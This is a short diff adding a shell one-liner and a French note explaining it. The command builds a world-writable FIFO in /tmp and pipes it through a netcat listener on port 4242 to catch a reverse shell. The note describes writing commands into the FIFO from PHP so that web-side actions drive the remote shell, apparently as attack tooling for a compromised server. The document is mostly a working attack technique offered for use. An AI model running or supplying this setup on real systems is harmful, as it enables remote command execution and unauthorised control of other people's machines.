@@ -1,0 +1,3 @@
+rm -f /tmp/reverseinput; mkfifo /tmp/reverseinput; chmod o+w /tmp/reverseinput; tail -f /tmp/reverseinput | nc -lvp 4242 | tee -a reverseoutput 1>/dev/null > reverseresult
+
+Permet d'obtenir un reverse shell dont l'entrée est en continu la fifo. Lorsqu'on écrit dans la fifo le reverse shell exécute l'entrée. L'idée est d'écrire dans le fichier avec php, et de lire le fichier de résultat si nécessaire (possibilité d'améliorer la sortie avec une autre fifo si besoin). On peut alors interfacer des actions php avec des commandes dans le reverse shell.
